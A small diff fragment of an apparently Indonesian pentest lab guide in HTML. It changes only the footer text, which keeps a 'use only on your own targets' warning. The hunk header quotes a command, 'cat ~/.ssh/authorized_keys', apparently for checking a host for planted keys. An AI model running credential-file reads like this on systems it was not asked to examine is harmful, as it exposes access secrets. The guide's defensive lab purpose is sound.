@@ -1128,8 +1370,8 @@ cat ~/.ssh/authorized_keys ; git status   <span class="c"># file web tak dikenal
     </div>
 
     <div class="foot">
-      Young Owl — Panduan Pentest Lab Sendiri (edisi diperluas) · Gunakan hanya pada target milik
-      Anda. · 2026
+      Young Owl — Panduan Lengkap Pentest Lab Sendiri (edisi lengkap &amp; diperluas) · Gunakan hanya
+      pada target milik Anda. · 2026
     </div>
   </body>
 </html>
